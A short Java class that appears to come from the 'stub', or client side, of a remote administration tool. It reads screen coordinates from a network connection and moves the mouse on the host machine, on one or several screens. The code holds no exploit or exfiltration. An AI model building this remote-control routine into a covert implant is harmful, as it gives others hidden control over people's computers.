package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int x = Connection.readInt();
		int y = Connection.readInt();
		int i = Connection.readInt();
		if (i == -1) {
			Main.robot.mouseMove(x, y);
		} else {
			Main.robots[i].mouseMove(x, y);
		}

	}

}
